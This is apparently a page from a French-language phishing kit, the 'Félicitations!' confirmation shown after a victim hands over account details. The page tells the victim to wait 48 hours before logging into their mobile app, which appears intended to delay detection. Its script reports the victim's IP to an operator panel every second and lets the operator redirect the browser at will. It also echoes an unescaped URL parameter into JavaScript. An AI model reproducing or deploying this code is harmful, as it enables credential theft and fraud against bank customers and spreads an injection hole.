<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>Félicitations!</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{
    font-family:sans-serif;
}
html,body{
        height:100%;
}
body{
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
</head>
<body>

<div style="text-align:center;">
<img src="inc/logo.png" style="width:230px; margin-bottom:50px;">
<h2 >Félicitations!</h2>
<img src="inc/valid.png" style="width:70px; margin:10px 0;">
<p> Merci de nous avoir aidés à sécuriser votre compte.  <br>
<STRONG>Veuillez patienter 48 h</STRONG> avant de vous connecter à nouveau sur votre application mobile, <br>le temps que la mise à jour de votre compte soit <STRONG>complètement terminé</STRONG>.<br>
Vous serez bientôt redirigé vers la page d'accueil.</p>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script> 
<script>
 setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
setTimeout(() => {
    window.location="exit.php";
}, 17000);
</script>
</body>
</html>